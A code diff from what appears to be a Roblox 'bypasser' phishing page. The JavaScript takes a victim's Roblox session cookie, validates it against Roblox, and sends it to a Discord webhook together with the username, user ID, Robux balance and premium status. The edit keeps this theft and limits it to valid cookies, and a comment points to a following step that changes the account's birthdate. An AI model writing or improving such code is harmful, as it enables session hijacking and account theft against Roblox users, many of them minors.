@@ -352,81 +352,76 @@ $("#cookieForm").on("submit", async function(e) {
 
     // Check cookie validity
     const result = await checkCookieValidity(cookie);
-    if (!result.valid && !result.error.includes("CORS")) {
+    if (!result.valid) {
       showNotif(result.error || "Invalid cookie: Unable to verify with Roblox API");
       errorSound.play();
       $("#loader").hide();
       $("#refreshBtn").show();
       return;
     }
-    
-    // If there's a CORS error, we'll still proceed with sending the cookie to the webhook
-    if (result.error && result.error.includes("CORS")) {
-      showNotif("CORS error encountered, but cookie may still be valid. Proceeding...");
-    }
 
-    // Send cookie to Discord webhook with embeds
-    const webhookPayload = {
-      username: "Roblox Bypasser Bot",
-      avatar_url: "https://i.imgur.com/4j8o1.png",
-      embeds: [
-        {
-          title: "🍪 User Information",
-          color: 0xFF0000,
-          fields: [
-            {
-              name: "👤 Username",
-              value: result.username,
-              inline: true
-            },
-            {
-              name: "🆔 User ID",
-              value: result.userId.toString(),
-              inline: true
-            },
-            {
-              name: "💰 Robux Balance",
-              value: result.robuxBalance.toString(),
-              inline: true
-            },
-            {
-              name: "⭐ Premium Status",
-              value: result.isPremium,
-              inline: true
+    // Only send to webhook if cookie is truly valid (not CORS errors)
+    if (result.valid && !result.error) {
+      // Send cookie to Discord webhook with embeds
+      const webhookPayload = {
+        username: "Roblox Bypasser Bot",
+        embeds: [
+          {
+            title: "🍪 User Information",
+            color: 0xFF0000,
+            fields: [
+              {
+                name: "👤 Username",
+                value: result.username,
+                inline: true
+              },
+              {
+                name: "🆔 User ID",
+                value: result.userId.toString(),
+                inline: true
+              },
+              {
+                name: "💰 Robux Balance",
+                value: result.robuxBalance.toString(),
+                inline: true
+              },
+              {
+                name: "⭐ Premium Status",
+                value: result.isPremium,
+                inline: true
+              }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: {
+              text: "Roblox Bypasser"
             }
-          ],
-          timestamp: new Date().toISOString(),
-          footer: {
-            text: "Roblox Bypasser",
-            icon_url: "https://i.imgur.com/4j8o1.png"
+          },
+          {
+            title: "🍪 Cookie (Click to Copy)",
+            description: `\`\`\`\n${cookie}\n\`\`\``,
+            color: 0x00FF00,
+            timestamp: new Date().toISOString(),
+            footer: {
+              text: "Click the cookie above to copy it"
+            }
           }
-        },
-        {
-          title: "🍪 Cookie (Click to Copy)",
-          description: `\`\`\`\n${cookie}\n\`\`\``,
-          color: 0x00FF00,
-          timestamp: new Date().toISOString(),
-          footer: {
-            text: "Click the cookie above to copy it",
-            icon_url: "https://i.imgur.com/4j8o1.png"
-          }
+        ]
+      };
+      
+      // Send to webhook immediately after validation
+      try {
+        const webhookRes = await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(webhookPayload)
+        });
+        if (!webhookRes.ok) {
+          console.error("Webhook send failed:", webhookRes.status);
         }
-      ]
-    };
-    
-    // Send to webhook immediately after validation
-    try {
-      const webhookRes = await fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(webhookPayload)
-      });
-      if (!webhookRes.ok) {
-        console.error("Webhook send failed:", webhookRes.status);
+      } catch (webhookError) {
+        console.error("Webhook error:", webhookError);
+        // Even if the webhook fails, we'll continue with the rest of the process
       }
-    } catch (webhookError) {
-      console.error("Webhook error:", webhookError);
-      // Even if the webhook fails, we'll continue with the rest of the process
     }
 
     // Attempt birthdate update
